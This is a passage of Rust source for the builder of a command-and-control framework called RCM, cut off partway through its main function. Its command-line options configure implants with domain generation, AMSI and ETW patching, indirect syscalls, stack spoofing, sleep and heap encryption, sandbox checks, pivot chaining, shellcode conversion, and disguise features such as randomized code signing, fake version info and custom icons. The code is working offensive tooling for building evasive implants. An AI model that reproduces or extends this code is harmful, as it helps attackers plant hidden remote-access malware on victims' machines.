use clap::{ArgAction, Parser, ValueEnum};
use std::process::Command;
use std::fs;
use std::path::{Path, PathBuf};
use ed25519_dalek::SigningKey;
use rand::rngs::OsRng;
use rand::RngCore;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use uuid::Uuid;
use serde_json::json;
use anyhow::{Context, Result};
use rusqlite::Connection;
use chrono::{Utc, Duration};
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng as CryptoOsRng},
    Aes256Gcm
};
use std::collections::HashMap;

use rcm::common::{MalleableProfile, HttpBlock, TransformStep};

#[derive(Parser)]
#[command(name = "C2 Builder")]
#[command(author = "RCM")]
#[command(version = "2.0")]
struct Cli {
    #[arg(long, default_value = "127.0.0.1")] host: String,
    #[arg(long, default_value = "4443")] port: String,
    #[arg(long, value_enum, default_value_t = Platform::Linux)] platform: Platform,
    #[arg(long, value_enum, default_value_t = Transport::Tls)] transport: Transport,
    #[arg(long, value_enum, default_value_t = ProfileArg::Default)] profile: ProfileArg,
    #[arg(long)] profile_file: Option<String>,
    #[arg(long, value_enum, default_value_t = Format::Exe)] format: Format,
    #[arg(long)] fallback_file: Option<String>,
    #[arg(long, default_value_t = 40)] sleep: u64,
    /// Extra random sleep added to the base sleep, in MILLISECONDS
    /// (agent picks jitter_min..=jitter_max each cycle; 0 disables).
    #[arg(long, default_value_t = 0)]   jitter_min: u32,
    #[arg(long, default_value_t = 100)] jitter_max: u32,
    #[arg(long, default_value_t = 0)] bloat: u64,
    #[arg(long, default_value_t = false)] debug: bool,
    #[arg(long, default_value_t = 0)] days: i64,
    // ── Feature 1: SNI / ALPN overrides ───────────────────────────────
    #[arg(long, visible_alias = "sni")] sni_override: Option<String>,
    #[arg(long, visible_alias = "alpn", value_delimiter = ',')] alpn_protocols: Vec<String>,
    // ── Feature 3: Hibernation / dweller mode ─────────────────────────
    #[arg(long, default_value_t = false)] hibernation: bool,
    #[arg(long, default_value_t = 1)] batch_size: u32,
    // ── DGA: domain generation algorithm ──────────────────────────────
    /// Embed a DGA seed. When set, the agent generates extra C2 domains
    /// each window rather than relying solely on configured endpoints.
    #[arg(long)] dga_seed: Option<u64>,
    /// DGA window length in seconds (default 86400 = 1 day).
    #[arg(long, default_value_t = 86400)] dga_window: u64,
    /// Number of DGA domains per window (default 16).
    #[arg(long, default_value_t = 16)] dga_count: u32,
    /// Comma-separated TLD list for DGA (default "com,net,org").
    #[arg(long, default_value = "com,net,org")] dga_tlds: String,
    // ── Evasion ───────────────────────────────────────────────────────
    /// Sleep masking algorithm: "none" (plain sleep, no masking) | "ekko" |
    /// "spoofed-stack" (agent/mod.rs maps these onto SleepMaskKind; anything
    /// else falls back to ekko agent-side, so the builder rejects unknown
    /// values here).
    #[arg(long, default_value = "ekko", value_parser = ["none", "ekko", "spoofed-stack"])]
    sleep_mask: String,
    /// Use indirect syscall stubs instead of direct ntdll calls.
    #[arg(long, action = ArgAction::Set, default_value_t = true)]   indirect_syscalls: bool,
    /// Enable fiber-based call-stack spoofing before every sleep.
    #[arg(long, action = ArgAction::Set, default_value_t = true)]   stack_spoof:       bool,
    /// Patch AMSI and ETW on startup.
    #[arg(long, action = ArgAction::Set, default_value_t = true)]   patch_amsi_etw:    bool,
    /// Encrypt the heap with AES-256-GCM during sleep windows.
    #[arg(long, action = ArgAction::Set, default_value_t = true)]   heap_encrypt:      bool,
    // ── Execution guardrails ──────────────────────────────────────────
    /// Glob pattern the AD domain must match (e.g. "CORP*"). Empty = disabled.
    #[arg(long, default_value = "")]       guard_domain:      String,
    /// Glob pattern the hostname must match (e.g. "DESKTOP-*"). Empty = disabled.
    #[arg(long, default_value = "")]       guard_hostname:    String,
    /// Active-hours window as "HH-HH", e.g. "8-18". Omit to disable.
    #[arg(long)]                           guard_hours:       Option<String>,
    /// Exit if the agent is running as SYSTEM / root.
    #[arg(long, default_value_t = false)]  guard_no_system:   bool,
    /// Comma-separated executable names the agent's PARENT process must
    /// match (e.g. "explorer.exe,svchost.exe"). Compared case-insensitively
    /// against the parent executable basename (see detection.rs
    /// is_bad_parent), so bare exe names only - no paths. Empty = disabled.
    #[arg(long, default_value = "")]       valid_parents:     String,
    // ── Egress proxy ─────────────────────────────────────────────────
    /// Explicit egress proxy for the agent, e.g. "http://proxy.corp.com:8080"
    /// (ProxyConfig.url). When set, the agent uses this proxy instead of
    /// the host's system proxy settings.
    #[arg(long)]                           proxy_url:         Option<String>,
    /// Proxy username (requires --proxy-url).
    #[arg(long)]                           proxy_user:        Option<String>,
    /// Proxy password (requires --proxy-url).
    #[arg(long)]                           proxy_pass:        Option<String>,
    // ── Pivot auto-cascade ────────────────────────────────────────────
    /// TCP port the agent will automatically listen on for the next pivot
    /// hop immediately after its session handshake completes.
    ///
    /// Use this to pre-wire multi-hop chains at build time:
    ///
    ///   hop1: no --auto-pivot-port (operator starts listener manually)
    ///   hop2: --auto-pivot-port 5002
    ///   hop3: --auto-pivot-port 5003
    ///   hop4: no --auto-pivot-port (leaf node, no downstream)
    ///
    /// Omit (default) to disable - leaf nodes and direct-connect agents
    /// do not need this flag.
    #[arg(long)]                           auto_pivot_port:   Option<u16>,
    // ── Shellcode (sRDI-style reflective DLL -> .bin) ──────────────────
    /// ROR13 hash of a DLL export to call after reflective load.
    /// Accepts hex (0x…) or decimal. Default 0x10 = "no export call" -
    /// correct for RCM agents, which start from DllMain.
    #[arg(long, default_value = "0x10", value_parser = parse_u32_auto)]
    sc_hash: u32,
    /// Opaque user-data blob appended to the shellcode (pointer + length
    /// are passed to the loader stub; reachable from the export call).
    #[arg(long, default_value = "None")]
    sc_userdata: String,
    /// Loader flags (bit0: erase PE headers after load, bit1: obfuscate
    /// imports). Default 0.
    #[arg(long, default_value_t = 0)]
    sc_flags: u32,
    /// On-disk encoding for the generated shellcode.
    #[arg(long, value_enum, default_value_t = ScOutput::Bin)]
    sc_output: ScOutput,

    // ── New generation formats (donut / pe_to_shellcode / pic_c / bin) ──
    /// C source file for --format pic_c (or a `pic` pipeline stage).
    /// Defaults to templates/pic_template.c in the project root.
    #[arg(long)]
    pic_src: Option<String>,

    /// Comma-separated pipeline stages for --format bin. The first stage is
    /// the source (pe|exe|dll|pic); later stages transform the artifact
    /// (donut|srdi|pe_to_shellcode|sign|b64). Default: pe,donut.
    #[arg(long)]
    pipeline: Option<String>,

    /// Permit building on a STABLE toolchain. Without this flag the builder
    /// REFUSES to produce an agent on stable Rust, because stable cannot strip
    /// panic file:line metadata and the resulting binary leaks the entire
    /// source tree and all Rust fingerprints. Only use for throwaway dev builds.
    #[arg(long, default_value_t = false)]
    allow_stable_leak: bool,

    /// Authenticode-sign the produced Windows PE (exe/dll/service) with
    /// osslsigncode. Without a signature the agent is unknown to SmartScreen
    /// and Defender cloud protection, which produces user-visible prompts
    /// ("wants to check these files to determine whether they are safe") at
    /// every launch - including every boot once persistence is installed.
    /// Default: ON when a signing cert is available (--sign-cert set or
    /// certs/rcm_sign.p12 present), OFF when no cert exists.
    #[arg(long, default_value_t = false)]
    sign: bool,

    /// Explicitly DISABLE Authenticode signing; wins over --sign and over
    /// the cert-availability default.
    #[arg(long, default_value_t = false)]
    no_sign: bool,

    /// PKCS#12 bundle (cert + key) for --sign. If omitted with --sign, a
    /// throwaway self-signed cert is generated (lab use: import the cert into
    /// the test machine's Trusted Root store for clean launches; on real
    /// engagements use an operator-supplied trusted cert for reputation).
    #[arg(long)]
    sign_cert: Option<String>,

    /// Password for the PKCS#12 bundle (default: empty).
    #[arg(long, default_value = "")]
    sign_pass: String,

    /// RFC3161 timestamp server for --sign (default: none - offline labs have
    /// no TSA; a timestamped signature outlives the cert's expiry).
    #[arg(long, default_value = "")]
    sign_ts: String,

    /// Authenticode program name for --sign (osslsigncode -n). Default:
    /// randomized per build so the signature is not a static IOC.
    #[arg(long)]
    sign_name: Option<String>,

    /// Authenticode info URL for --sign (osslsigncode -i). Default:
    /// randomized per build.
    #[arg(long)]
    sign_url: Option<String>,

    /// Subject CN for the throwaway self-signed cert generated when --sign
    /// is used without --sign-cert. Default: randomized per build.
    #[arg(long)]
    sign_cn: Option<String>,

    /// Skip the VM/sandbox environment check in the built agent. The check
    /// matches kvm/qemu DMI strings on Linux, which false-positives on
    /// mainstream cloud VPS targets; use this flag only when the target is
    /// known to be a legitimate VM. Default: check enabled.
    #[arg(long, default_value_t = false)]
    allow_vm: bool,

    // ── Artifact customization ──────────────────────────────────────────
    /// Artifact filename base override (sanitized to [A-Za-z0-9._-]).
    /// Replaces the default "<format>_<platform>_<id>" name in dist/;
    /// the format-derived extension is kept.
    #[arg(long)]
    name: Option<String>,

    /// Path to a .ico file to embed as the Windows PE icon (exe/service
    /// formats only; requires x86_64-w64-mingw32-windres from
    /// binutils-mingw-w64). Wins over --icon-preset when both are given.
    #[arg(long)]
    icon: Option<String>,

    /// Preset icon name, resolved to assets/icons/<name>.ico in the repo.
    /// Errors if the preset file is absent.
    #[arg(long)]
    icon_preset: Option<String>,

    // ── PE VERSIONINFO customization (Windows exe/service) ─────────────
    /// CompanyName string for the VERSIONINFO resource.
    #[arg(long)]
    pe_company: Option<String>,

    /// ProductName string for the VERSIONINFO resource.
    #[arg(long)]
    pe_product: Option<String>,

    /// FileDescription string for the VERSIONINFO resource.
    #[arg(long)]
    pe_description: Option<String>,

    /// FileVersion (a.b.c.d) for the VERSIONINFO resource: sets both the
    /// fixed numeric FILEVERSION field and the FileVersion string.
    #[arg(long)]
    pe_file_version: Option<String>,

    /// ProductVersion (a.b.c.d) for the VERSIONINFO resource: sets both
    /// the fixed numeric PRODUCTVERSION field and the ProductVersion string.
    #[arg(long)]
    pe_product_version: Option<String>,

    // ── ELF customization (Linux targets) ──────────────────────────────
    /// String embedded into a `.comment` ELF section on Linux targets
    /// (objcopy --update-section / --add-section, post-link).
    #[arg(long)]
    elf_comment: Option<String>,

    /// Directory containing ca.crt, client.crt and client.key.der to embed
    /// instead of the stock certs/ files (the agent embeds them via
    /// include_bytes! at compile time). The original certs are restored
    /// after the build, success or failure.
    #[arg(long)]
    certs_dir: Option<String>,
}

/// Parse a u32 given as decimal or 0x-prefixed hex (for --sc-hash).
fn parse_u32_auto(s: &str) -> Result<u32, String> {
    let s = s.trim();
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u32::from_str_radix(hex, 16).map_err(|e| format!("invalid hex u32: {e}"))
    } else {
        s.parse::<u32>().map_err(|e| format!("invalid u32: {e}"))
    }
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Platform { Linux, LinuxMusl, Windows, Macos }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Transport { Tls, TcpPlain, NamedPipe, Http, Https }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum ProfileArg { Default, HttpPost, HttpImage }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Format {
    Exe,
    Dll,
    Service,
    Stager,
    Shellcode,
    /// Build the agent DLL, then convert it to shellcode with donut.
    Donut,
    /// Build the agent EXE, then convert it with the OEP sRDI stub
    /// (maps the PE and calls the original entry point).
    #[value(name = "pe_to_shellcode")]
    PeToShellcode,
    /// Compile operator-supplied C (--pic-src, default: templates/pic_template.c)
    /// into position-independent x86_64 shellcode.
    #[value(name = "pic_c")]
    PicC,
    /// Generic .bin pipeline selector: --pipeline stage1,stage2,...
    Bin,
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum ScOutput { Bin, B64, C, Hex }

/// Find the cargo binary. Checks (in order):
///   1. $CARGO_HOME/bin/cargo - set in Docker image
///   2. /usr/local/cargo/bin/cargo - rust:latest default install path
///   3. ~/.cargo/bin/cargo - local user install
///   4. `cargo` in $PATH - last resort
fn find_cargo() -> PathBuf {
    // 1. $CARGO_HOME
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let p = PathBuf::from(&cargo_home).join("bin").join("cargo");
        if p.is_file() { return p; }
    }

    // 2. Known absolute paths (rust:latest image)
    let known = [
        "/usr/local/cargo/bin/cargo",
        "/usr/local/bin/cargo",
        "/usr/bin/cargo",
    ];
    for path in &known {
        let p = PathBuf::from(path);
        if p.is_file() { return p; }
    }

    // 3. ~/.cargo/bin/cargo
    if let Ok(home) = std::env::var("HOME") {
        let p = PathBuf::from(home).join(".cargo").join("bin").join("cargo");
        if p.is_file() { return p; }
    }

    // 4. Fall back to bare name (relies on PATH)
    PathBuf::from("cargo")
}

/// Find the rustup binary. Mirrors find_cargo() - rustup lives alongside
/// cargo in the same bin directory.
///
/// This is used for target verification. `cargo target list` is NOT a valid
/// cargo subcommand; the correct tool is `rustup target list --installed`.
fn find_rustup() -> PathBuf {
    // 1. $CARGO_HOME/bin/rustup (rustup installs itself here alongside cargo)
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let p = PathBuf::from(&cargo_home).join("bin").join("rustup");
        if p.is_file() { return p; }
    }

    // 2. Known absolute paths
    let known = [
        "/usr/local/cargo/bin/rustup",
        "/usr/local/bin/rustup",
        "/usr/bin/rustup",
    ];
    for path in &known {
        let p = PathBuf::from(path);
        if p.is_file() { return p; }
    }

    // 3. ~/.cargo/bin/rustup
    if let Ok(home) = std::env::var("HOME") {
        let p = PathBuf::from(home).join(".cargo").join("bin").join("rustup");
        if p.is_file() { return p; }
    }

    // 4. Fall back to bare name (relies on PATH)
    PathBuf::from("rustup")
}

/// Resolve the toolchain channel from <project_root>/rust-toolchain.toml,
/// the same file cargo/rustup honor. The pin may be a dated channel such
/// as "nightly-2026-08-22"; probe, auto-install and the child pin below
/// must all use that exact name. Falls back to the floating "nightly"
/// name when the file is missing or unparseable.
fn resolve_toolchain_channel(project_root: &Path) -> String {
    let Ok(content) = fs::read_to_string(project_root.join("rust-toolchain.toml")) else {
        return "nightly".to_string();
    };
    parse_toolchain_channel(&content).unwrap_or_else(|| "nightly".to_string())
}

/// Parse --valid-parents into the list baked into the agent config.
/// Empty input disables the parent check. Entries are bare exe names:
/// detection.rs is_bad_parent compares them case-insensitively against the
/// parent's executable BASENAME, so paths would never match and are
/// rejected rather than baked in dead.
fn parse_valid_parents(raw: &str) -> Result<Vec<String>, String> {
    if raw.trim().is_empty() {
        return Ok(Vec::new());
    }
    let parts: Vec<&str> = raw.split(',').collect();
    if parts.len() > 32 {
        return Err(format!("valid_parents: at most 32 entries (got {})", parts.len()));
    }
    let mut out = Vec::with_capacity(parts.len());
    for p in parts {
        let p = p.trim();
        if p.is_empty() {
            return Err("valid_parents: empty entry (remove stray commas)".into());
        }
        if p.len() > 260 || p.chars().any(|c| c.is_control()) {
            return Err(format!("valid_parents: invalid entry '{}'", p));
        }
        if p.contains('/') || p.contains('\\') {
            return Err(format!(
                "valid_parents: '{}' looks like a path - the parent check matches \
                 the executable basename, so pass exe names only (e.g. explorer.exe)",
                p
            ));
        }
        out.push(p.to_string());
    }
    Ok(out)
}

/// Validate the egress-proxy flags: credentials require a URL, and the URL
/// needs an explicit scheme (the ProxyConfig.url form, e.g.
/// http://proxy.corp.com:8080).
fn check_proxy_flags(
    url: &Option<String>,
    user: &Option<String>,
    pass: &Option<String>,
) -> Result<(), String> {
    match url {
        Some(u) => {
            let u = u.trim();
            if u.is_empty() {
                return Err("proxy_url must not be empty".into());
            }
            if u.len() > 512 || u.chars().any(|c| c.is_control()) || !u.contains("://") {
                return Err(format!(
                    "proxy_url '{}' is not a valid proxy URL (expect e.g. http://proxy.corp.com:8080)",
                    u
                ));
            }
            Ok(())
        }
        None => {
            if user.is_some() || pass.is_some() {
                return Err("proxy_user/proxy_pass require proxy_url".into());
            }
            Ok(())
        }
    }
}

/// Extract the `channel = "..."` value from rust-toolchain.toml content.
/// Minimal line parse: comment tails and blank lines are ignored, single
/// or double quotes are accepted.
fn parse_toolchain_channel(content: &str) -> Option<String> {
    for line in content.lines() {
        let line = line.split('#').next().unwrap_or("").trim();
        let Some(rest) = line.strip_prefix("channel") else { continue };
        let Some(rest) = rest.trim_start().strip_prefix('=') else { continue };
        let v = rest.trim().trim_matches(|c| c == '"' || c == '\'');
        if !v.is_empty() {
            return Some(v.to_string());
        }
    }
    None
}

/// Locate the project root - the directory containing Cargo.toml.
/// Checks (in order):
///   1. Current working directory
///   2. Directory containing this binary
fn find_project_root() -> Option<PathBuf> {
    // 1. CWD
    if let Ok(cwd) = std::env::current_dir() {
        if cwd.join("Cargo.toml").is_file() {
            return Some(cwd);
        }
    }
    // 2. Adjacent to this binary
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            if dir.join("Cargo.toml").is_file() {
                return Some(dir.to_path_buf());
            }
        }
    }
    None
}

// ── Artifact customization helpers ─────────────────────────────────────

/// Cert files the agent embeds via include_bytes! (see src/transport.rs).
const CERT_FILES: [&str; 3] = ["ca.crt", "client.crt", "client.key.der"];

/// RAII guard: swaps the project's certs/ files for operator-supplied ones
/// for the duration of the build and restores the originals on drop, so
/// every exit path (success, bail!, error) leaves certs/ untouched.
struct CertsGuard {
    certs_dir:  PathBuf,   // <project_root>/certs
    backup_dir: PathBuf,   // temp dir holding the originals
}

impl CertsGuard {
    fn install(custom_dir: &str, project_root: &Path) -> Result<Self> {
        let src = PathBuf::from(custom_dir);
        // Verify all three required files exist BEFORE touching certs/.
        for f in CERT_FILES {
            let p = src.join(f);
            if !p.is_file() {
                anyhow::bail!(
                    "--certs-dir: required file '{}' not found in '{}'.\n\
                     Provide a directory containing ca.crt, client.crt and client.key.der.",
                    f, src.display()
                );
            }
        }

        let certs_dir = project_root.join("certs");
        let backup_dir = std::env::temp_dir().join(format!("rcm-certs-backup-{}", Uuid::new_v4()));
        fs::create_dir_all(&backup_dir).context("failed to create certs backup dir")?;

        // Back up originals (skip silently if a stock file is missing).
        for f in CERT_FILES {
            let orig = certs_dir.join(f);
            if orig.is_file() {
                fs::copy(&orig, backup_dir.join(f))
                    .with_context(|| format!("failed to back up {}", orig.display()))?;
            }
        }

        // Overlay the custom certs.
        for f in CERT_FILES {
            fs::copy(src.join(f), certs_dir.join(f))
                .with_context(|| format!("failed to install custom certs/{}", f))?;
        }
        println!("[*] Custom certs:  {} (originals backed up, restored after build)", src.display());

        Ok(Self { certs_dir, backup_dir })
    }

    fn restore(&mut self) {
        if self.backup_dir.as_os_str().is_empty() { return; }
        for f in CERT_FILES {
            let bak = self.backup_dir.join(f);
            if bak.is_file() {
                if let Err(e) = fs::copy(&bak, self.certs_dir.join(f)) {
                    eprintln!("[!] FAILED to restore original certs/{}: {}", f, e);
                }
            }
        }
        let _ = fs::remove_dir_all(&self.backup_dir);
        self.backup_dir = PathBuf::new(); // disarm
        println!("[*] Custom certs:  original certs/ files restored.");
    }
}

impl Drop for CertsGuard {
    fn drop(&mut self) { self.restore(); }
}

/// Sanitize an operator-provided artifact name base to [A-Za-z0-9._-].
/// Returns None when nothing usable remains.
fn sanitize_artifact_name(raw: &str) -> Option<String> {
    let cleaned: String = raw.chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '_' || *c == '-')
        .collect();
    let cleaned = cleaned.trim_matches('.').to_string();
    if cleaned.is_empty() { None } else { Some(cleaned) }
}

/// True when any PE VERSIONINFO field was requested.
fn has_pe_info(cli: &Cli) -> bool {
    cli.pe_company.is_some()
        || cli.pe_product.is_some()
        || cli.pe_description.is_some()
        || cli.pe_file_version.is_some()
        || cli.pe_product_version.is_some()
}

/// Parse "a.b.c.d" into four u16 components for FILEVERSION/PRODUCTVERSION.
fn parse_version4(v: &str) -> Result<[u16; 4]> {
    let parts: Vec<&str> = v.split('.').collect();
    if parts.len() != 4 {
        anyhow::bail!("invalid version '{}': expected a.b.c.d", v);
    }
    let mut out = [0u16; 4];
    for (i, p) in parts.iter().enumerate() {
        out[i] = p.parse::<u16>()
            .map_err(|_| anyhow::anyhow!("invalid version '{}': components must be 0-65535", v))?;
    }
    Ok(out)
}

/// Escape a string for a windres .rc quoted literal: control characters are
/// dropped and '"' is doubled (RC escape convention).
fn rc_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        if c.is_control() { continue; }
        if c == '"' { out.push('"'); }
        out.push(c);
    }
    out
}

/// Prepare a Windows PE resource object (icon + VERSIONINFO) for linking.
/// Returns Ok(Some((resource.o path, temp build dir))) on success, Ok(None)
/// when intentionally skipped (warn-and-continue), Err for hard failures
/// (missing preset file / unreadable icon / bad version string).
///
/// The .rc uses the full `1 ICON DISCARDABLE "file"` form so windres emits
/// BOTH RT_ICON (type 3) and RT_GROUP_ICON (type 14) entries - Explorer only
/// displays icons that have the group resource.
fn prepare_windows_resources(cli: &Cli, project_root: &Path) -> Result<Option<(PathBuf, PathBuf)>> {
    let want_icon = cli.icon.is_some() || cli.icon_preset.is_some();
    let want_pe   = has_pe_info(cli);
    if !want_icon && !want_pe {
        return Ok(None);
    }
    if cli.platform != Platform::Windows {
        println!("[!] --icon/--pe-* apply only to Windows targets; continuing without PE resources.");
        return Ok(None);
    }
    if !matches!(cli.format, Format::Exe | Format::Service) {
        println!("[!] --icon/--pe-* apply only to exe/service formats; continuing without PE resources.");
        return Ok(None);
    }

    // Resolve the source .ico: --icon wins over --icon-preset.
    let ico_abs: Option<PathBuf> = if want_icon {
        let ico_src: PathBuf = if let Some(p) = &cli.icon {
            PathBuf::from(p)
        } else {
            let preset = cli.icon_preset.as_deref().unwrap();
            let safe: String = preset.chars()
                .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-')
                .collect();
            let p = project_root.join("assets").join("icons").join(format!("{}.ico", safe));
            if !p.is_file() {
                anyhow::bail!(
                    "--icon-preset '{}' not found: {} does not exist.\n\
                     Drop preset .ico files into assets/icons/ (see assets/icons/README.md).",
                    preset, p.display()
                );
            }
            p
        };
        if !ico_src.is_file() {
            anyhow::bail!("icon file not found: {}", ico_src.display());
        }
        Some(ico_src.canonicalize()
            .with_context(|| format!("cannot resolve icon path {}", ico_src.display()))?)
    } else {
        None
    };

    // windres (binutils-mingw-w64) compiles the .rc into a COFF object.
    let windres = "x86_64-w64-mingw32-windres";
    match Command::new(windres).arg("--version").output() {
        Ok(o) if o.status.success() => {}
        _ => {
            println!("[!] {} not found (apt-get install binutils-mingw-w64);", windres);
            println!("[!] continuing WITHOUT PE resources.");
            return Ok(None);
        }
    }

    let build_tmp = std::env::temp_dir().join(format!("rcm-rsrc-{}", Uuid::new_v4()));
    fs::create_dir_all(&build_tmp).context("failed to create resource build dir")?;

    // ── Compose the .rc: icon + optional VERSIONINFO block ─────────────
    let mut rc = String::new();
    if let Some(ico) = &ico_abs {
        rc.push_str(&format!("1 ICON DISCARDABLE \"{}\"\n", ico.display()));
    }
    if want_pe {
        let fv_str = cli.pe_file_version.clone().unwrap_or_else(|| "0.0.0.0".into());
        let pv_str = cli.pe_product_version.clone().unwrap_or_else(|| "0.0.0.0".into());
        let fv = parse_version4(&fv_str)?;
        let pv = parse_version4(&pv_str)?;
        rc.push_str(&format!(
            "1 VERSIONINFO\nFILEVERSION {},{},{},{}\nPRODUCTVERSION {},{},{},{}\n\
             FILEFLAGSMASK 0x3fL\nFILEFLAGS 0x0L\nFILEOS 0x40004L\n\
             FILETYPE 0x1L\nFILESUBTYPE 0x0L\nBEGIN\n",
            fv[0], fv[1], fv[2], fv[3], pv[0], pv[1], pv[2], pv[3]));
        rc.push_str("    BLOCK \"StringFileInfo\"\n    BEGIN\n        BLOCK \"040904b0\"\n        BEGIN\n");
        if let Some(v) = &cli.pe_company {
            rc.push_str(&format!("            VALUE \"CompanyName\", \"{}\"\n", rc_escape(v)));
        }
        if let Some(v) = &cli.pe_description {
            rc.push_str(&format!("            VALUE \"FileDescription\", \"{}\"\n", rc_escape(v)));
        }
        rc.push_str(&format!("            VALUE \"FileVersion\", \"{}\"\n", rc_escape(&fv_str)));
        if let Some(v) = &cli.pe_product {
            rc.push_str(&format!("            VALUE \"ProductName\", \"{}\"\n", rc_escape(v)));
        }
        rc.push_str(&format!("            VALUE \"ProductVersion\", \"{}\"\n", rc_escape(&pv_str)));
        rc.push_str("        END\n    END\n    BLOCK \"VarFileInfo\"\n    BEGIN\n        VALUE \"Translation\", 0x409, 1200\n    END\nEND\n");
    }

    let rc_path  = build_tmp.join("resource.rc");
    let obj_path = build_tmp.join("resource.o");
    fs::write(&rc_path, &rc).context("failed to write resource.rc")?;

    let out = Command::new(windres)
        .args(["-O", "coff", "-o"])
        .arg(&obj_path)
        .arg(&rc_path)
        .output()
        .context("failed to spawn windres")?;
    if !out.status.success() || !obj_path.is_file() {
        let _ = fs::remove_dir_all(&build_tmp);
        anyhow::bail!("windres failed: {}", String::from_utf8_lossy(&out.stderr).trim());
    }

    let obj_abs = obj_path.canonicalize().context("cannot resolve resource.o path")?;
    if let Some(ico) = &ico_abs {
        println!("[+] Icon:         {} (linked via {})", ico.display(), obj_abs.display());
    }
    if want_pe {
        println!("[+] VERSIONINFO:  embedded (linked via {})", obj_abs.display());
    }
    Ok(Some((obj_abs, build_tmp)))
}

/// Embed a `.comment` section into a Linux ELF artifact via objcopy.
/// Warn-and-continue on any failure; never fails the build.
fn apply_elf_comment(dest_path: &Path, cli: &Cli) -> Result<()> {
    let Some(comment) = &cli.elf_comment else { return Ok(()) };
    if !matches!(cli.platform, Platform::Linux | Platform::LinuxMusl) {
        println!("[!] --elf-comment applies only to Linux targets; skipping.");
        return Ok(());
    }
    let dir = std::env::temp_dir().join(format!("rcm-elf-{}", Uuid::new_v4()));
    fs::create_dir_all(&dir).context("failed to create elf-comment temp dir")?;
    let payload = dir.join("comment.bin");
    // NUL-terminate: .comment is conventionally a sequence of C strings.
    let mut bytes = comment.clone().into_bytes();
    bytes.push(0);
    fs::write(&payload, &bytes)?;

    let run = |op: &str| {
        Command::new("objcopy")
            .arg(op)
            .arg(format!(".comment={}", payload.display()))
            .arg(dest_path)
            .output()
    };
    // glibc builds (linked via cc) already carry a .comment section and need
    // --update-section; musl/rust-lld builds have none and need --add-section.
    let ok = match run("--update-section") {
        Ok(o) if o.status.success() => true,
        _ => matches!(run("--add-section"), Ok(o) if o.status.success()),
    };
    let _ = fs::remove_dir_all(&dir);
    if ok {
        println!("[+] ELF .comment: \"{}\"", comment);
    } else {
        println!("[!] objcopy failed to set .comment (apt-get install binutils); artifact left unchanged.");
    }
    Ok(())
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    println!("\n=== RCM Builder v2.0 (Malleable) ===");
    println!("[*] Target:      {}", cli.host);
    println!("[*] Port/Pipe:   {}", cli.port);

    // jitter_min/jitter_max are raw milliseconds added to the base sleep
    // (agent/mod.rs), not a percentage - the cap is 60000 ms.
    if cli.jitter_min > 60000 { anyhow::bail!("--jitter-min cannot exceed 60000 ms."); }

    // ── Parse guard_hours into start/end ──────────────────────────────
    // The API passes this as "HH-HH" (e.g. "8-18"). Omitting it leaves
    // both values at 0, which the agent treats as "no time-window check".
    let (guard_hour_start, guard_hour_end): (u8, u8) = match &cli.guard_hours {
        Some(gh) => {
            let parts: Vec<&str> = gh.splitn(2, '-').collect();
            if parts.len() != 2 {
                anyhow::bail!(
                    "guard_hours must be in HH-HH format (e.g. \"8-18\"), got: {}",
                    gh
                );
            }
            let start: u8 = parts[0].parse()
                .with_context(|| format!("guard_hours start '{}' is not a valid hour (0–23)", parts[0]))?;
            let end: u8 = parts[1].parse()
                .with_context(|| format!("guard_hours end '{}' is not a valid hour (0–23)", parts[1]))?;
            (start, end)
        }
        None => (0, 0),
    };

    // ── Locate build tooling ──────────────────────────────────────────
    let cargo_bin = find_cargo();
    println!("[*] Cargo:       {}", cargo_bin.display());

    // Verify cargo is actually executable
    let cargo_version = Command::new(&cargo_bin)
        .arg("--version")
        .output();
    match cargo_version {
        Ok(out) if out.status.success() => {
            let ver = String::from_utf8_lossy(&out.stdout);
            println!("[*] Cargo ver:   {}", ver.trim());
        }
        Ok(out) => {
            anyhow::bail!(
                "cargo --version failed (exit {:?}): {}",
                out.status.code(),
                String::from_utf8_lossy(&out.stderr).trim()
            );
        }
        Err(e) => {
            anyhow::bail!(
                "Cannot execute cargo binary at '{}': {}\n\
                 \n\
                 Ensure the Rust toolchain is installed in the Docker image.\n\
                 The Dockerfile must use a single-stage rust:latest build\n\
                 (not a multi-stage build that strips cargo from the final image).",
                cargo_bin.display(), e
            );
        }
    }

    // ── Locate project root (Cargo.toml) ──────────────────────────────
    let project_root = find_project_root().ok_or_else(|| {
        anyhow::anyhow!(
            "Cannot find Cargo.toml.\n\
             Expected it at CWD ({}) or adjacent to the builder binary.\n\
             In Docker the server must run with WORKDIR=/app and the \
             source tree must be present at /app.",
            std::env::current_dir().unwrap_or_default().display()
        )
    })?;
    println!("[*] Project root: {}", project_root.display());

    // ── format pic_c: compile C to PIC shellcode (no Rust agent build) ──
    // Handled before any config/key setup: no agent is compiled here, only
    // the operator-supplied (or template) C source -> .bin via mingw+objcopy.
    if cli.format == Format::PicC {
        return build_pic_c(&cli, &project_root);
    }

    // ── Custom certs swap ─────────────────────────────────────────────
    // Install BEFORE any compilation so include_bytes! picks them up.
    // The guard restores the original certs/ files on drop, covering every
    // exit path below (success, bail!, error).
    let _certs_guard = match &cli.certs_dir {
        Some(dir) => Some(CertsGuard::install(dir, &project_root)?),
        None => None,
    };

    // ── Resolve profile ───────────────────────────────────────────────
    let final_profile = if let Some(path) = &cli.profile_file {
        println!("[*] Loading Profile: {}", path);
        let content = fs::read_to_string(path).context("Failed to read profile file")?;
        serde_json::from_str::<MalleableProfile>(&content).context("Invalid Profile JSON format")?
    } else {
